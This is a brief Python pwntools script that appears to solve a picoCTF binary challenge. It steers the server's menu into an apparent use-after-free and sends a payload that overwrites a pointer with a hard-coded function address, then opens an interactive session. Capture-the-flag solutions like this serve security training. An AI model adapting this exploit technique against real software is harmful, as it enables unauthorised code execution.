from pwn import *

from socket import *
from struct import *

p = remote('mercury.picoctf.net',61817)

p.recvuntil('(e)xit')
p.sendline('i')

p.recvuntil('?')
p.sendline('Y')

p.recvuntil('(e)xit')
p.sendline('l')

p.recvuntil(':')
payload=p32(0x80487d6)+p32(0)
p.sendline(payload)

p.interactive()



